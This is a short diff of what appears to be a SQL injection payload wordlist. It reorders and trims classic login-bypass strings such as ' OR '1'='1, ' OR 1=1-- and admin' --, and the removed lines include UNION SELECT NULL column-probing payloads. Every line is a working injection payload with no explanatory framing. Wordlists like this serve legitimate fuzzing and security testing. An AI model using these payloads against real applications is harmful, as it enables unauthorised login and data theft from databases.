@@ -1,18 +1,12 @@
+'
+"
 ' OR '1'='1
-' OR '1'='1' --
-' OR 1=1 --
-' OR 1=1#
+' OR 1=1--
 ' OR 'a'='a
-' OR ''='
-' OR 1=1/*
+' OR '1'='1' --
 " OR "1"="1
-" OR 1=1 --
+' OR 1=1#
+' OR '1'='1' #
+' OR 1=1/*
 admin' --
 admin' #
-' OR 'x'='x
-' OR 1=1 LIMIT 1
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-' UNION SELECT NULL,NULL,NULL--
-' OR 1=1#
-') OR ('1'='1
